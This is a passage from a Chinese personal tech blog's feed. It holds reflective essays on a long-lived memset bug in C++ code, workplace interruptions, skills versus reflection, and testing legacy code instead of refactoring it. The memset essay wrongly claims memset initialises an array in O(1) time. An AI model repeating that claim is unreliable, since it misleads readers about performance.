Low <span class="token operator">=</span> new <span class="token keyword">int</span><span class="token punctuation">[</span>N<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">// 能够回溯的最早次序号</span>    <span class="token function">setIntArrayVal</span><span class="token punctuation">(</span>DFN<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> N<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setIntArrayVal</span><span class="token punctuation">(</span>Low<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> N<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    SCC_id <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    SCC <span class="token operator">=</span> new <span class="token keyword">int</span><span class="token punctuation">[</span>N<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">// 辅助栈</span>    Status <span class="token operator">=</span> new <span class="token keyword">int</span><span class="token punctuation">[</span>N<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">// 辅助栈状态</span>    <span class="token function">setIntArrayVal</span><span class="token punctuation">(</span>Status<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> N<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    sp <span class="token operator">=</span> new Shrink_point<span class="token punctuation">[</span>N<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 缩点（极大强连通分量）</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> solve<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">setIntArrayVal</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span> array<span class="token punctuation">,</span> <span class="token keyword">int</span> val<span class="token punctuation">,</span> <span class="token keyword">int</span> len<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">memset</span><span class="token punctuation">(</span>array<span class="token punctuation">,</span> val<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">*</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>诚然，突然要我查一段几年前写下的代码是否有bug，我内心是比较抗拒的——尤其是我自己写的代码（我对自己还是有相当自信的）——毕竟人的弱点就是不善于揭发自己的短处。不过这都只是次要的心理因素。</p><p>归根结底，所谓打铁趁热，bug也是越早发现越好，**<em>新代码的bug总是要比历史代码的bug更容易处理**</em>。而面对这个陈年老bug，我已经完全忘记了我在5年前写这段代码的思绪，所以要我马上就应付甲的质疑是不可能的。与其再花费一番周折琢磨我自己的代码，我干脆直接就举手投问：“所有测试用例运行可以通过，是哪里有bug呢？”</p><h2 id="因注释而蔓延"><a href="#因注释而蔓延" class="headerlink" title="因注释而蔓延"></a>因注释而蔓延</h2><p>甲告诉我，是memset函数使用错误：在C++中，函数memset的作用是对一段连续的内存块赋值，即赋值的单位是字节，换而言之memset只能用于字节数组，但int数组不是字节数组。</p><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> solve<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">setIntArrayVal</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span> array<span class="token punctuation">,</span> <span class="token keyword">int</span> val<span class="token punctuation">,</span> <span class="token keyword">int</span> len<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">memset</span><span class="token punctuation">(</span>array<span class="token punctuation">,</span> val<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">*</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>老实说，我很高兴甲会如此仔细的看我5年前的代码。而且毫无疑问，他的观点是正确的。但是也不见得我就是错的。因为早在那时我就已经知道memset函数的局限所在，但我坚持要用这个函数做数组的初始化，是因为我看中了它的效率——</p><p>相对于逐个赋值的方法初始化数组元素、memset的效率要高得多，因为从寻址次数来看，前者的时间复杂度是O(n)、后者是O(1)，更何况当时所解决问题的n是上千万级别的。虽然我把memset用在非字节数组，只要我保证初始化的值只为0就不会有任何问题。事实上也是如此。</p><p>于是我自信满满地告诉甲，单纯断章取义地看我这个方法，确实是一个bug。但如果整体地去看我的代码就恰恰相反，**<em>我只是利用了bug，并得到了更高效的处理**</em>。</p><p>但是甲之后的一席话确实值得我深思：</p><p>“或许对目前的这份代码而言，这个bug是被你巧妙地利用了，但是我觉得**<em>真正的bug或许不是你的代码，而是你没有文字注释去说明你的想法**</em>。不要忘记你已经共享了你的代码，当更多人看到这段程序时，如果他们不了解menset的原理就照样搬用，那么你就无异于在别人的代码中散播了bug，因为你不能把他们代码中的val限制为0。”</p><h2 id="最危险的组合"><a href="#最危险的组合" class="headerlink" title="最危险的组合"></a>最危险的组合</h2><p>不得不承认，甲是对的。即使我有足够的自信在5年后仍然记得利用这个bug的前因后果，但在这5年间早已误了不少别人的子弟……</p><p>不过话说回来，先不论这个bug的蔓延性，甲能够如此深入琢磨我的历史遗留物、并发现这个bug实属难得——在软件中有一种bug是最难被发现的：组合式的bug。组合式的bug有两种类型：相辅相成型、相互弥补型——甲在我代码中发现的bug就属于后者。</p><p>相辅相成型：举例而言，一个bug是楼梯很滑，另一个bug扶手坏了，但除非这两个bug同时存在，否则只有其中一个bug是不足以让人摔下楼梯的。</p><p>相互弥补型：它与相辅相成型刚好相反，只有两个bug同时存在（或不存在）程序才会正常运行。若只修正了其中一个bug，另一个bug就会曝露出来，而且会让人有误以为自己改错了的假象，因为修改之前程序是可以正常运行的。</p><p>之所以说它难以发现，因为组合bug几乎无迹可寻，尤其是相互弥补型。除非是编译原理的狂热爱好者、抑或出现了非常极端的运行环境。**<em>存在组合bug的程序，其通常状态无异于正常程序，而且可能正常运行了很长时间都没有曝露出来**</em>。</p><p>回到我的代码，它已经正常运行5年了。如果甲没有向我质问他心中的疑惑，而是擅自修改了他所发现的bug，那么我的程序就无法正常运行了——而甲就很可能会因此陷入怀疑自己的正确性的境地。</p><h2 id="令人头痛的陈年老BUG（终章）"><a href="#令人头痛的陈年老BUG（终章）" class="headerlink" title="令人头痛的陈年老BUG（终章）"></a>令人头痛的陈年老BUG（终章）</h2><p>事实上，不是所有bug都需要解决掉的。很多时候我们明明知道正在为代码引入一个bug，但是我们却依然保留它。因为回避它的代价太大了，我们宁愿限制它的前提条件不让它轻易发生、或者将其“圈养”起来（如try-catch）不让它暴走——**<em>如何容忍bug也是一门学问**</em>。</p><p>不过也总有一些技术葩喜欢另辟蹊径，誓言要代表月亮消灭所有bug维护代码界安全——先不说甲就是这种人，反正我是不会去消灭一个几年前就已经知道的bug的。如果要消灭它，我当时就做了，何必等到现在。</p><p>这前面提到的“新bug更易于旧bug被解决”是一个原因，但我真正担忧的是我或许会引入更多不可控的bug——代码的历史太久远了，我已经近乎忘记了它的逻辑，我一旦盲目修改，完全有可能采用了更危险的方法去解决那个稳定了5年的bug。</p><p>很多时候，我们写完一段代码，只要程序能够编译运行、完成需求功能就算完成了，鲜有考究bug的可能性，大部分的bug都是通过日后使用时再去发现和解决的。其实解决bug的黄金时间在于代码刚被编写的时候，这时候我们往往只需看到异常提示，就可以马上定位异常原因，因为潜意识中我们已经隐约觉得哪个位置会报什么异常了。</p><p>所以当我们在面对一些陈年老bug的时候，其实早就已经错过了解决它的最好时机。这时候不妨将其圈养起来，可能相比于消灭它，会令代码更安全。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 心路历程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
            <tag> BUG </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>请还我安静的 4 小时</title>
      <link href="/articles/insights/qing-huan-wo-an-jing-de-4-xiao-shi/"/>
      <url>/articles/insights/qing-huan-wo-an-jing-de-4-xiao-shi/</url>
      
        <content type="html"><![CDATA[<p>我大概总结了我每天分配的工作时间，一般情况下，我是这样汇报我的工作情况的：</p><p><img src="./01.png" alt="我理想中的工作时间表"></p><p>实际上，我的工作情况却可能是这样的：</p><p><img src="./02.png" alt="我现实中的工作时间表"></p><p>表面看来，这两个时间表所完成的工作内容是一模一样的，而且第一个时间表似乎可以更清晰地表述我一天的工作情况。但是它却无法反映出我的困扰：正如第二个凌乱的时间表所示——我的工作实际上是由无数的时间碎片构成的，而我们大部分人可能早已习惯了这个不正常的时间表。</p><p>通常，管理者为了更有效率地利用时间，他们很擅长在同一个时间处理多个问题，因为这可以体现出他们处事的应变能力。但我们程序员则更倾向于能够专注地做一件事：同样一件事，相比于断断续续地做4小时，专心地连续做4小时的效率要高得多。工作本就贵在专注，而一旦那种专注的状态被破坏，要恢复这种状态非但不易、而且还会白白浪费很多时间。</p><p>大家曾经都可能玩过一个堆纸牌金字塔的游戏，越想要砌得高、所需要的专注时间越长： </p><p><img src="./03.png"></p><p>程序员开发软件，就好比堆纸牌的过程，想要迅速稳固，那么从开始到完成必须一气呵成，中途不能受到一丝打扰，否则整座金字塔都会散架，只能重头开始。</p><p>开发好的软件需要投入大量的精神时间，没有一段时间的酝酿是无法开展工作的。有时我们好不容易才有了一个构思的雏形，突如其来的打扰就会造成整个构思破产。这就是为什么每个程序员都非常讨厌在工作时被打扰的原因——可能十分钟的打扰，会多浪费我们一个小时的时间——这绝不是夸大其辞。</p><p>可惜往往事与愿违，公司绝大多数的环境都不允许我们安静地坐下来，完完全全地做自己的工作。在公司每天都有着持续不断的商讨、邮件、电话需要处理，其实这些事情很多都不是主要工作，但是因为时效性要求很高，把我们真正的工作时间变得支离破碎。</p><p>此前，我看过一篇关于 “时间是如何被浪费掉”的讨论。里面有个观点大概是说，浪费时间最危险的方式不是放纵消遣，而是花时间去“做假事”。因为当我们消遣的时候，至少知道我们在放纵自己，负罪感会让我们很快地结束这种状态。而所谓的“做假事”，是指我们在工作时间做一些非实质性的工作，例如收发邮件——花一整天的时间去处理邮件不是什么难以置信的事情，而且整个过程我们都会心安理得，因为这确实是工作。但如果过后问自己今天做了什么，我想很多人的答案基本上都是什么也没干。</p><p>我每天的工作都充斥着大量的假事。这些假事本已占用了工作时间，还因为不确定的出现时机，把主要工作的时间也掺和了。我的不少朋友都说，正是由于假事太多，导致白天在公司里根本无法静下心来做任何事情。他们宁愿选择在晚上完成主要工作，而在白天做一些次要的工作——或许这恰好也就是众多程序员都是夜猫子的成因，因为晚上没人打扰。</p><p>其实就我个人而论也是如此。我有时周末需要加班，但如非必要（如协同工作），我宁愿把工作带回去家里做。一来节省了来回公司的时间，二来效率确实比在公司高得多，往往要在公司做一天的事情，我在家里可能仅仅只需要短短的几个小时。</p><p>不过公司始终是公司，沟通交流是不可避免的一环，我们无法改变这个大环境，唯有从自身作要求，首先从不频繁地打扰别人做起，希望由此可以慢慢形成一种氛围——借由提供别人安静的工作环境，换取自己安静的工作环境——我要求不高，还我安静的3 - 4小时足矣。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 心路历程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>半杯水</title>
      <link href="/articles/insights/ban-bei-shui/"/>
      <url>/articles/insights/ban-bei-shui/</url>
      
        <content type="html"><![CDATA[<blockquote><p>读 《<a href="https://book.douban.com/subject/6709809/">暗时间</a>》 有感</p></blockquote><h2 id="这应该算是引子"><a href="#这应该算是引子" class="headerlink" title="这应该算是引子"></a>这应该算是引子</h2><p>半杯水 —— 思如杯，技如水，技盈则满，思盈则空。虚而不满，似无物，可容万物。</p><p>有一个辩题为「能力和思维哪个更重要」。我不选边站，「学而不思则惘，思而不学则怠」，物极必反是亘古之理。只是现在社会的竞争过大，很多人为了眼下的生活，都过份追求自身能力的发展，而忽略了不时反思自身的那份态度。</p><p>我之前问过一个海纳百川的朋友：「你什么新技能都去试，也不想想学得多而不精有什么用？」 于是他告诉我，这样才能在短时间内让上司知道自己有什么变化，而且新东西可以显得自己与众不同。</p><p>我想说，其实如果你可以坚持每天不穿衣服去上班，也是可以起到同样效果的…… 同理，我也不认为一味思考人生就会变得很好，当然如果你想成为下一个「深井冰」，那就另当别论了。</p><p>其实辩题不应该是哪个更重要，因为都重要。关键是如何在两者之间寻求平衡，保持半杯水的「状态」 —— 但我更倾向于认为这是种互补的「心态」：不过分依赖能力、也不过分依赖思考，不过分依赖自己、也不过分依赖他人，为身边的一切寻求互补，不卑不亢，聪明地做事。</p><h2 id="分节目录"><a href="#分节目录" class="headerlink" title="分节目录"></a>分节目录</h2><table><thead><tr><th align="left">-</th><th align="left">-</th></tr></thead><tbody><tr><td align="left">●  苦逼程序猿，劳模运维狮</td><td align="left">—— 工作怪圈</td></tr><tr><td align="left">●  你需要K.I.S.S</td><td align="left">—— 跳出怪圈（程序猿篇）</td></tr><tr><td align="left">●  掌控你的资源</td><td align="left">—— 跳出怪圈（运维狮篇）</td></tr><tr><td align="left">●  能力与方法</td><td align="left">—— 正确地使用你的能力</td></tr><tr><td align="left">●  囚徒困境</td><td align="left">—— 别宅了，抱团吧</td></tr><tr><td align="left">●  人的核心竞争力</td><td align="left">—— 技能不是万能</td></tr><tr><td align="left">●  书写是为了更好地思考</td><td align="left">—— 你的思维需要降速</td></tr></tbody></table><h2 id="苦逼程序猿，劳模运维狮"><a href="#苦逼程序猿，劳模运维狮" class="headerlink" title="苦逼程序猿，劳模运维狮"></a>苦逼程序猿，劳模运维狮</h2><p>对程序猿而言，「重构」永远是最大的课题。</p><p>程序猿最困扰的，莫过于总要面对一堆乱七八糟的历史代码 —— 历史代码其本身可能并不混乱，只是经手的人多了，面目全非罢了。从心理上看，一份代码越混乱，对于维护结果抱着「无所谓」的心态越明显。但不负责任的恶性维护，尽头只能是重构，而即使重构了，却也只是新循环的开始。</p><p>而对于运维狮，「自动」应是他们最终所追求的幻想。</p><p>运维狮的工作核心基本无一例外的就是要面对大量的机器、大量的程序副本、不知何时会崩坏的线程，还要时常排查天文数字一样的监控数据，到头来却不知道自己究竟在维护什么。</p><p>即使渴望可以自动化完成这一切，但「羊群效应」却使得大多数运维狮无意识地从众，因为有安全感的，尤其所面对的东西是未知的时候 —— 既然已经有那么多非自动化部署的程序 …… 于是又手动拷贝了一份程序副本。</p><p>我们总是在嘲笑历史上的别人留下一堆麻烦，历史却总是惊人的相似 —— 因为我们在抱怨别人的烂摊子的同时，一边给别人制造烂摊子却不自知。若始终不肯抛弃「自我感觉良好」的心态，所有人都只能苦逼地活在别人制造的圈子里，然后成为别人嘲笑的劳模。这个循环是时候结束了。</p><h2 id="你需要K-I-S-S"><a href="#你需要K-I-S-S" class="headerlink" title="你需要K.I.S.S"></a>你需要K.I.S.S</h2><p>首先要声明的是，不要理会别人的维护质量有多烂，从自身做起，保持良好的心态，负责任地维护每一份代码才是一个程序猿应有的职业素质。</p><p>但是总有一些代码经过历史不断的修补而变得过于复杂，复杂到我们宁愿放弃80%的功能（这并不是确切的划分，只是我深受二八定律影响罢了）去重构一份简洁的代码 —— 当然如果还有保有我们所需要的那些功能就更好了。</p><p>良好的开端比什么都重要。程序猿觉得代码维护困难，根本原因在于程序设计阶段没有做好。所以无论如何，只要你一下定决心要重构，请务必由始至终把K.I.S.S原则铭记在心。K.I.S.S，即「Keep it simple,stupid!」，直译过来就是「保持简单，傻瓜」。确实，把程序复杂化无助于性能和资源的管控，也使得后续的使用和维护更加困难。</p><p>有一条程序猿悖论如是说：「程序猿的工作效率并不会随着资历的增加而有显著提高」。究其原因，年轻的程序猿会耗费大量的工作时间去敲写几万行代码以体现能力；而老程序猿更倾向于在深入思考后再写出几百行代码以体现质量，即使偶尔花了大量时间在写代码上，一般也只是为了这几百行代码找到最优的组合而已。</p><p>这是因为所有老程序猿都明白，华而不实的工作能力，只会使我们的工作变得更加困难。只有简单才是美，为了简单我们不惜付出任何代价。</p><h2 id="掌控你的资源"><a href="#掌控你的资源" class="headerlink" title="掌控你的资源"></a>掌控你的资源</h2><p>相对于程序猿，运维狮没有推翻一切重来的「重构」手段，因此需要的更多是务实的精神，但务实不等同于蛮干，技巧也很重要。一个合格的运维狮应该思考的不是「能做多少」，而是「如何做得最少」。</p><p>如果你觉得维护工作开始变得困难，或者已经很困难，就需要审视自己是否有正确利用身边的资源以提高自身的工作效率和质量。不要奢望「自家的」程序猿什么时候能提供自动化的程序使你的工作变得轻松，关注第三方的运维工具并利用起来才是王道，毕竟现在的社会，什么东西都是「别人家的」更好啊。</p><p>有一条成功的箴言如是说：「要看一个人是否成功，看他晚上8点之后在干什么」。其实也是很浅显的道理，白天谋生、晚上谋事。作为运维狮，虽然少有晚上时间，但闲下来的时候必须学会充实自己。如果你还在迷茫应该学习什么，或者我能够为你指两个方向：</p><ul><li>掌握shell/sed/awk三剑客编程：学会编写定制化的脚本</li><li>掌握自动化部署工具ansible：用程序生成程序、而不是手工复制</li></ul><p>特别一提的是，不少运维狮容易受工作内容所限，生疏于编程语言、甚至不懂编程语言。其实不妨走出自己的圈子，学习一些编程语言，打通前后端，更有利于自身的工作。在维护出现问题的程序的时候，「知道用什么方法解决」和「知道为什么可以这样解决」是两种截然不同的境界。</p><p>这里说一个题外话，我在协助现场维护工作的时候，发现运维狮和用户之间总有争取硬件资源的矛盾。所谓「宁花机器一分，不费程序员一秒」，程序量提高了，用户却迟迟不肯放宽硬件资源，很多时候可能是没有看到有力的「证据」。如果能够做到常态化监控，并把性能数据持续集成健康的报表，对用户透明化，或许争取资源会更容易，这也是一种做事手段。</p><h2 id="能力与方法"><a href="#能力与方法" class="headerlink" title="能力与方法"></a>能力与方法</h2><blockquote><p>「如果你手里有一把锤子，所有东西看上去都像钉子」。  —— 这不是我说的。</p></blockquote><p>往往我们可能花费了大量时间去学习一项技能，而学无所用是所有人最不愿意发生的事情。于是我们就会尝试在各个方面炫耀这项新技能，而不管它是否适用。</p><p>在我学习设计模式之初，就陷入了这种状态，几乎不能自拔。确实，设计模式为我打开了一扇大门，我首次知道原来代码也可以写得如此优美，使得我迫不及待地寻找可以应用它们的项目，哪怕只有一点可以用得上。但牵强附会总是没有好结果的。</p><p>再如我现在所参与的技术框架开发，虽然一些工具组件已经被成功推广起来了，但一些工具组件却依然不为人所知。不是说这些组件没有技术性，究其原因也是适用性问题。所谓的工具是为了提高开发效率才被制造出来的，而很多同事就投诉说，为了使用一个工具必须注意这注意那，还要配置一堆有的没的东西，甚至还可能与业务逻辑不兼容，如此复杂还不如自己实现。于是他们真的选择了抛弃这些工具。</p><p>所以其实正确的做事态度应该是：「如果你想钉一个钉子，所有东西看上去都像是锤子」。</p><p>即我们在处理问题时，优先考虑的是要做什么What，而不是怎么做How。只有先明确目的，才去选择合适的工具，而不是拿着一把工具对所有事情都勉而为之。正确而有效率地做事，谨记以下几点，受用无穷：</p><ul><li>方向比努力更重要：莫要南辕北辙</li><li>流程比修补更重要：无规矩不成方圆</li><li>方法比拼命更重要：事半功倍</li></ul><h2 id="囚徒困境"><a href="#囚徒困境" class="headerlink" title="囚徒困境"></a>囚徒困境</h2><p>在信息时代，「大鱼吃小鱼」已成为过去，如今是「快鱼吃慢鱼」。但如何能够「快」？在软件开发中，如果单凭一个人在闭关修炼技术，无论学习能力多么像海绵，也不可能短时间内海纳百川，又如何能快得起来？其实这也恰好说明你开始需要一个团队了 —— 为了综合实力，取长补短。</p><p>软件开发的本质就是一项团队运动，人与人的因素对结果的影响完全不亚于技术因素。一个项目成功的关键不仅仅是写出漂亮的代码，团队中的所有人朝着同一个目标一起合作也是同样重要的。但团队工作经常遇到的问题，就是沟通问题，我遇到的主要有两种情况：不愿意沟通，或无法正确表达自己想法。</p><p>举一个博弈中的著名栗子，「囚徒困境」。大概是描述这样的一个问题：两个疑犯被隔离审讯，由于证据不足，若两个都抵赖则均判1年，两个都坦白则均判8年，一个坦白一个抵赖则坦白的释放、抵赖判10年。</p><p>从整体利益上考量，最优的方案是两者均抵赖。但由于两个疑犯不知对方所想，在对方可能会抵赖的怀疑下，局限于自身利益进行判断，都会选择坦白，以保证自身利益最大化。</p><p>囚徒困境也是在团队工作中，缺乏沟通或沟通不当的必然结果。所谓的团队任务，就是要每个人承担一块工作，分别完成后再整合。如果都只从自身角度做考量而不顾他人，即使自己工作得非常出色，但最终却无法与他人的工作完成整合，那么也只是在做无用功。</p><p>只有通过不断的沟通、磨合，才可能保证整体的利益最大化，一盘散沙，终难成事。所谓「要学做事，先学做人」，时刻谨记我们都只是半杯水：内修本领、追求极致，固然重要；外联朋志、寻求互补，方是王道 —— 抱团取暖 = 力量大。</p><h2 id="人的核心竞争力"><a href="#人的核心竞争力" class="headerlink" title="人的核心竞争力"></a>人的核心竞争力</h2><p>前面讲述的都是一些现实性的东西，那些确实都是我们用来竞争的实质性资本。但毕竟随着工作的更替，很多东西也就过时了。而不过时的只有思考的方式，或者说只有思考才真正是我们作为人的不可替代的核心竞争力。</p><p>下面这些是我平时或蒐集、或所悟的「箴言」，既然是分享，我就不要脸地「借鉴」过来了。有时这些看似与技能毫无关系的东西，可能恰好就在某个转折点决定了人生，所以都参考着看一下吧：</p><ul><li>万事先修德，养性必制怒。</li><li>广交朋友并为他们做事情。</li><li>多参与社区活动，积极分享，锻炼口才。</li><li>锻炼身体，笑到最后得有一副好身体。</li><li>反思是让人得以改进自己的最重要的思维品质。</li><li>「教」是最好的「学」。</li><li>我们都是半杯水，正是这样人生才有意义，不卑不亢，寻找互补。</li><li>人生就是一场修行，人必自助而天助之。</li><li>读书，尤其是读那些非实用性的书（如心理学等）。</li><li>潜心一到两项业余爱好，参与一些艺术活动。</li><li>不断寻找偷懒的方法，聪明地工作。</li><li>越努力，越幸运。</li><li>与智者交谈，思考，并常做笔记。</li><li>犯错趁早，防微杜渐。</li><li>因上努力，果上求缘。</li></ul><h2 id="书写是为了更好地思考"><a href="#书写是为了更好地思考" class="headerlink" title="书写是为了更好地思考"></a>书写是为了更好地思考</h2><p>最后，这是一个我自身的一个小故事。  —— 一个我成为「作家（虚伪的）」之前的故事。</p><p>以前我们读书的时候，每天的工作就是写。而现在工作了，扪心自问，又还有谁拿起过笔？恐怕都差不多执笔忘字了吧。</p><p>那为什么我们需要书写？</p><p>众所周知，物理上速度的极限是光速。但撇开物理不谈，比光速更快的，则是人的思维 —— 因为光从地球到火星都需要400秒，而人想一下就到了。</p><p>这不是脑筋急转弯，大部分人应该有过这样的经历：在思考一个问题很久却不得果时，都会试着问一下别人的想法。但当我们把问题描述一次给对方的时候，对方还没做出回答，我们就突然「想通」了。</p><p>这是因为，我们在思考问题的时候，往往已经想明白了各个细节要如何解决，但由于思维速度过快、跳跃性太大，在想细节A的时候、忘记了细节B，想B的时候又忘记了A，从而引起「想不透」或「总觉得哪里不对」的假象。</p><p>而通过文字将问题重新描述一次，实际上就是一个将思考「降速」并「梳理」的过程。因此如果一直想不透一个问题，不妨用笔将其写下来，往往问题就迎刃而解了。有时可能还会因此有意外的收获。</p><p>以上。</p><p>所以….</p><p>所以我好像丝毫没有提到那个故事，这是因为我知道你们不会想看的。</p><p>但其实你已经猜到那个故事了 —— </p><p>所以大家都积极地写一点东西去记录自己的点点滴滴吧！</p><p>或许一开始你可能会纠结怎样可以写出令人眼前一亮的东西，但当你意识到这可以让你更好地思考的时候，你就会摒弃这种纠结。当你慢慢习惯怎样用文字去描述你的想法时，所谓「思如泉涌」也不过如是罢了。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 心路历程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 重构 </tag>
            
            <tag> 随笔 </tag>
            
            <tag> 暗时间 </tag>
            
            <tag> K.I.S.S </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>别让你的能力成为绊脚石</title>
      <link href="/articles/insights/bie-rang-ni-de-neng-li-cheng-wei-ban-jiao-shi/"/>
      <url>/articles/insights/bie-rang-ni-de-neng-li-cheng-wei-ban-jiao-shi/</url>
      
        <content type="html"><![CDATA[<p>在溺水时拼命抓住的，真的是救命稻草吗？</p><p>能力越强的人，往往对自己的能力越是依赖。但相对地，处理危机的灵活性可能就越弱——尤其在环境发生巨大变化时，这种能力或许就是妨碍自身拓展最大的绊脚石。</p><p>人都是善于习惯的动物：长期沉溺在单一的环境中，虽培养了能力、但同时也习惯了一成不变的感觉。尤其是在自身日益卓越的时候，更易于陶醉于自己的能力，稍有不慎便会让自负的优越感侵蚀全身，甚至于逐渐对其他技能产生淡漠感、对环境变化产生迟钝感。</p><p>俗话说“居安思危”。自身能力越是接近临界点的时候，也就是最容易让人安于现状的时候——擅长的能力难以提升、其他能力又无心拓展，一旦连最基本的危机感都失去，离被淘汰也就不远了。在此节骨眼上，往往是我们选择的分岔口：是追求精益求精、抑或探求一专多长？我不能帮任何人做出选择，但我个人认为，仅满足于一种能力对自身未必有益：在职业生涯中需要的能力是多元化的，因为这有利于我们可以在环境变化时快速反应、调整自身。我们更需要的是能及时抓住机遇，永远不要被一叶障目、成为井底之蛙。</p><p>或许终将有一日，海上刮起大浪，我们都翻船了、溺水了。这不是危言耸听。于是乎，我们为了自救，出于本能地拼命去抓住身边能够抓住的一切——而我们的能力就是我们的一切——但若是我们只有一种能力，那么能抓住的就只有这根稻草。这毫无办法，即使我们深知这根稻草恐怕无法让我们活命。</p><p>当然，并不是能力越多，活命的机会就越大，这两者并无绝对的相关性。我只是说，能力越多，我们能够选择自救的机会就越多——或者会出现浮板、甚至是木船——至少不会是那根弱不禁风的稻草。</p><p>我很清楚，我也只是个溺水的人。</p><p>但我们都将会是溺水的人。不过，我们都不应该只有一根稻草。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 心路历程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我们需要的，是测试而非重构</title>
      <link href="/articles/insights/wo-men-xu-yao-de-shi-ce-shi-er-fei-chong-gou/"/>
      <url>/articles/insights/wo-men-xu-yao-de-shi-ce-shi-er-fei-chong-gou/</url>
      
        <content type="html"><![CDATA[<p>上台一鞠躬。是的，久别两个月我又回来了。</p><p>最近忙着杂七杂八的一堆事，不过基本都是维护老项目代码了。一说起这个亘古不变的老话题，估计许多人都要开始抱怨了吧：没有格式没有篇章的混乱、没有甚至是错误的注释、没有说明文档……“我可写不出这种天才代码”、“实在太难看了，我要重构”之类的话我已经听不少了。</p><p>读代码难，但写代码也不见得很容易。老代码们都有着他们自己的项目背景，经手的人也多，日积月累自然而言就变成了现在的样子了。重构——说是很容易的——先不论我们的能力跟当时开发者相比孰优孰劣，他们会写出这样的代码总有他们的理由，只是经过时间的磨蚀，当时的缘由我们就不得而知了。</p><p>重构不是对付老代码最好的手段。重构首先会遇到最大的问题，就是刚才提到的项目背景，大多数的老代码除了满足基本需求功能，后期还会不断临时加入满足某些用户需求的特殊功能，若对这些不了解就轻易地重构，势必造成代码功能缺失。</p><p>之所以那么多人要重构老代码，因为我们都对它恐惧。而恐惧，则是源于我们对它的不了解。维护老代码时，我们怕破坏它的功能、怕造成程序的不稳定……我们维护自己的代码时，何曾会怕这怕那的？希望对老代码进行重构，不过是因为我们想把它变成自己的东西、方便自己操作而已。可一旦交接给下一个人，没准他又开始喊着要重构我们的代码了吧。</p><p>老代码告诉我们的是它的基本的样貌，不到万不得已，不必通过重构对它进行整容。我们只需要使用测试用例，去矫正它在岁月中留下的伤疤。</p><p>事实上，我们也应该强迫自己持续地给老代码做测试。刚开始这样做，可能会使得进度缓慢，但长期下去，我们